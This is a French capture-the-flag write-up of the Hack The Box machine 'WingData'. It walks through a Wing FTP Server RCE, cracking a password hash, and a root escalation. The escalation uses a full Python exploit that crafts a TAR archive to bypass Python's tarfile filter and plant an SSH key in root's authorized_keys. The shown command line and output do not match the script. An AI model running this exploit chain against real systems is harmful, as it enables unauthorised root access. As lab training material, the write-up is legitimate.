# Hack The Box — WingData (Easy)

## Informations

| Élément    | Valeur      |
| ---------- | ----------- |
| Machine    | WingData    |
| Difficulté | Easy        |
| OS         | Linux       |
| IP         | 10.129.3.73 |

---

# 1. Reconnaissance

## Scan Nmap

```bash
nmap -sS -sC -sV -O -T4 10.129.3.73
```

Résultat :

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.66
```

Informations importantes :

* **SSH (22)** → accès possible si credentials trouvés
* **HTTP (80)** → application web

---

# 2. Enumeration Web

En accédant au site :

```
http://10.129.3.73
```

La page redirige vers :

```
http://wingdata.htb
```

Il faut donc ajouter l'entrée dans `/etc/hosts`.

```bash
10.129.3.73 wingdata.htb
```

Sur le site, on trouve un lien :

```
Client Portal
```

Ce lien redirige vers :

```
ftp.wingdata.htb
```

Ajout également dans le fichier hosts :

```
10.129.3.73 ftp.wingdata.htb
```

---

# 3. Identification du service vulnérable

La page correspond à un **Wing FTP Server v7.4.3**.

Cette version possède une vulnérabilité critique :

```
Wing FTP Server <= 7.4.3
CVE-2025-47812
Unauthenticated Remote Code Execution
```

Exploit Metasploit utilisé :

```
exploit/multi/http/wingftp_null_byte_rce
```

---

# 4. Exploitation (RCE)

L'exploit permet d'obtenir un accès au serveur.

Cependant, l'accès obtenu est sous l'utilisateur :

```
wingdata
```

---

# 5. Enumeration locale

En explorant le système, un dossier intéressant est découvert :

```
/opt/wftpserver/Data/1/users
```

Un fichier XML contient un **hash de mot de passe**.

Exemple :

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

---

# 6. Identification du hash

Utilisation de **hash-identifier** :

```
Possible Hashs:
SHA-256
Haval-256
```

---

# 7. Crack du hash

Commande utilisée :

```bash
hashcat -a 0 -m 1410 hash:WingFTP /usr/share/wordlists/rockyou.txt.gz
```

Explication :

```
mode 1410 = sha256($pass.$salt)
salt = WingFTP
```

Résultat :

```
!#7Blushing^*Bride5
```

---

# 8. Accès SSH

Connexion avec l'utilisateur **wacky**.

```bash
ssh wacky@10.129.3.73
```

Mot de passe :

```
!#7Blushing^*Bride5
```

Connexion réussie.

---

# 9. User Flag

```bash
cat user.txt
```

```
1aec5753f2dba3d8f94ac5e85915423d
```

---

# 10. Privilege Escalation

Vérification des permissions sudo :

```bash
sudo -l
```

Résultat :

```
(root) NOPASSWD:
/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

Le script Python suivant peut être exécuté en **root** :

```
/opt/backup_clients/restore_backup_clients.py
```

---

# 11. Analyse du script

Le script :

```
restore_backup_clients.py
```

fonctionne ainsi :

1. Vérifie le nom du backup
2. Vérifie le tag du restore
3. Extrait une archive TAR dans :

```
/opt/backup_clients/restored_backups
```

Extraction réalisée avec :

```python
tar.extractall(path=staging_dir, filter="data")
```

Cette fonction est vulnérable à un **bypass du filtre tarfile**.

---

# 12. Vulnérabilité utilisée

Vulnérabilité Python :

```
CVE-2025-4138
CVE-2025-4517
Python tarfile PATH_MAX Filter Bypass
```

Cette vulnérabilité permet :

* bypass du filtre `filter="data"`
* écriture de fichiers **hors du dossier d'extraction**

Objectif :

```
/root/.ssh/authorized_keys
```

---

# 13. Génération de la clé SSH

Sur la machine cible :

```bash
ssh-keygen -t ed25519 -f ~/.ssh/wingdata_key -N ""
```

Clé publique :

```
~/.ssh/wingdata_key.pub
```

---

# 14. Création du TAR malveillant

Script exploit :

```python
#!/usr/bin/env python3
"""
CVE-2025-4138 / CVE-2025-4517 — Python tarfile PATH_MAX Filter Bypass
Exploit TAR builder with embedded SSH payload
"""

import tarfile
import io
import os

# Constants for Linux
DIR_COMP_LEN = 247
CHAIN_STEPS = "abcdefghijklmnop"
LONG_LINK_LEN = 254

# === PAYLOAD ===
# Replace this with your public key if needed
PAYLOAD = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXXXXXXXXXXXXXXXXXXXXXXXXXXXX wacky@wingdata\n"

TARGET_FILE = "/root/.ssh/authorized_keys"


def build_exploit_tar(tar_path, payload, file_mode=0o600):
    comp = "d" * DIR_COMP_LEN
    inner_path = ""

    with tarfile.open(tar_path, "w") as tar:

        # Stage 1: Chain of symlinks
        for step_char in CHAIN_STEPS:

            d = tarfile.TarInfo(name=os.path.join(inner_path, comp))
            d.type = tarfile.DIRTYPE
            tar.addfile(d)

            s = tarfile.TarInfo(name=os.path.join(inner_path, step_char))
            s.type = tarfile.SYMTYPE
            s.linkname = comp
            tar.addfile(s)

            inner_path = os.path.join(inner_path, comp)

        # Stage 2: Pivot symlink
        short_chain = "/".join(CHAIN_STEPS)
        link_name = os.path.join(short_chain, "l" * LONG_LINK_LEN)

        pivot = tarfile.TarInfo(name=link_name)
        pivot.type = tarfile.SYMTYPE
        pivot.linkname = "../" * len(CHAIN_STEPS)
        tar.addfile(pivot)

        # Stage 3: Escape symlink
        target_dir = os.path.dirname(TARGET_FILE)
        target_basename = os.path.basename(TARGET_FILE)

        depth = 8
        escape_linkname = (
            link_name + "/" + ("../" * depth) + target_dir.lstrip("/")
        )

        esc = tarfile.TarInfo(name="escape")
        esc.type = tarfile.SYMTYPE
        esc.linkname = escape_linkname
        tar.addfile(esc)

        # Stage 4: Write payload
        payload_entry = tarfile.TarInfo(name=f"escape/{target_basename}")
        payload_entry.type = tarfile.REGTYPE
        payload_entry.size = len(payload)
        payload_entry.mode = file_mode
        payload_entry.uid = 0
        payload_entry.gid = 0

        tar.addfile(payload_entry, fileobj=io.BytesIO(payload))

    print("[+] Exploit TAR generated")
    print(f"[+] File: {tar_path}")
    print(f"[+] Target: {TARGET_FILE}")


def main():
    build_exploit_tar("backup_666.tar", PAYLOAD)


if __name__ == "__main__":
    main()
```

```bash
python3 exploit.py --tar-out backup_666.tar --preset ssh-key --payload ~/.ssh/wingdata_key.pub
```

Résultat :

```
[+] Exploit tar: backup_666.tar
[+] Target: /root/.ssh/authorized_keys
```

---

# 15. Placement du backup

Le script sudo lit les backups dans :

```
/opt/backup_clients/backups
```

Donc :

```bash
mv backup_666.tar /opt/backup_clients/backups/
```

---

# 16. Exécution du script root

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
-b backup_666.tar \
-r restore_hacked
```

Sortie :

```
[+] Backup: backup_666.tar
[+] Extraction completed
```

La clé SSH est maintenant écrite dans :

```
/root/.ssh/authorized_keys
```

---

# 17. Accès Root

Connexion SSH avec la clé privée :

```bash
ssh -i ~/.ssh/wingdata_key root@localhost
```

Connexion réussie.

---

# 18. Root Flag

```bash
cat root.txt
```

```
84e727250e7213e33891e3ebb65d41cc
```

---

# Conclusion

Chaîne d'exploitation complète :

1. **Enumeration Web**
2. Découverte du **Wing FTP Server**
3. Exploitation **CVE-2025-47812 (RCE)**
4. Récupération d'un **hash utilisateur**
5. **Crack du mot de passe**
6. Accès **SSH (user wacky)**
7. Découverte d'un **script sudo vulnérable**
8. Exploitation **Python tarfile filter bypass**
9. Injection de **clé SSH root**
10. Accès **root**
